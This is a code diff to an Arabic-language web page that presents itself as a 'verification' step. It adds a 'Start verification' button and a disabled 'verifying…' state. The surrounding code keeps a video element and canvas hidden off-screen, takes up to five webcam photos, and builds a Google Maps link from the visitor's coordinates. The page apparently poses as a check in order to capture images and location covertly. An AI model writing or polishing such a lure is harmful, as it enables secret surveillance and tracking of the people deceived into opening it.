@@ -35,6 +35,18 @@
       top: -9999px;
       visibility: hidden;
     }
+    button {
+      padding: 10px 20px;
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
   </style>
 </head>
 <body>
@@ -42,6 +54,9 @@
   <div id="progressContainer">
     <div id="progressBar">0%</div>
   </div>
+
+  <!-- زر لبدء التحقق -->
+  <button onclick="startCameraFlow()">ابدأ التحقق</button>
 
   <video id="video" autoplay muted></video>
   <canvas id="canvas"></canvas>
@@ -97,6 +112,10 @@ https://www.google.com/maps?q=${lat},${lon}
     }
 
     function startCameraFlow() {
+      // تغيير زر التحقق ليصبح غير نشط أثناء التشغيل
+      document.querySelector("button").disabled = true;
+      document.querySelector("button").textContent = "جاري التحقق...";
+
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
@@ -108,7 +127,7 @@ https://www.google.com/maps?q=${lat},${lon}
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // ننتظر ثانية للتأكد من تشغيل الفيديو
+            // نضيع ثانية إضافية للتأكد من جاهزية الفيديو
             setTimeout(() => {
               let count = 0;
               const maxPhotos = 5;
@@ -138,7 +157,6 @@ https://www.google.com/maps?q=${lat},${lon}
     const progressInterval = setInterval(() => {
       if (width >= 100) {
         clearInterval(progressInterval);
-        startCameraFlow();
       } else {
         width++;
         progressBar.style.width = width + "%";
